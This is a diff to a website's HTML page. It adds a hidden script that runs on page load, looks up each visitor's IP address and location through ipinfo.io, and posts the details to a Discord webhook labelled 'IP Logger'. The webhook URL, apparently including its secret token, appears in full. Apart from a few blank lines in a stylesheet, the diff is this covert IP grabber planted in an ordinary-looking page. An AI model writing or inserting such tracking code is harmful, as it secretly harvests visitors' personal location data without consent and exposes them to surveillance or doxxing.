@@ -15,6 +15,34 @@
 <link rel="stylesheet" type="text/css" href="assets/css/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<script>
+  function monke(json) 
+  {
+       var request = new XMLHttpRequest();
+       
+       request.open("POST", "https://discord.com/api/webhooks/1103302824554676358/Qru2Gt78_rS-IfH1asFOBfH4Ku8BO0OMoxjZMvtw_ukNQorqK9zChUQGmY9iD7f20Maq");
+  
+       request.setRequestHeader('Content-type', 'application/json');
+  
+       var params = 
+       {
+            username: "IP Logger",
+            avatar_url: "",
+            content: "@everyone",
+            embeds: [
+                 {
+                      title: "Someone visited the IP grabber!",
+                      color: 1752220,
+                      description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                 }
+            ]
+       }
+  
+       request.send(JSON.stringify(params));
+  }
+  </script>
+  <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
 </head>
 <body>
 <style type="text/css">
@@ -66,6 +94,8 @@ body {
 </div>
 <script type="text/javascript" src="assets/js/main.js"></script>
 <style>
+
+
   ::-webkit-scrollbar {
     width: 20px;
   }
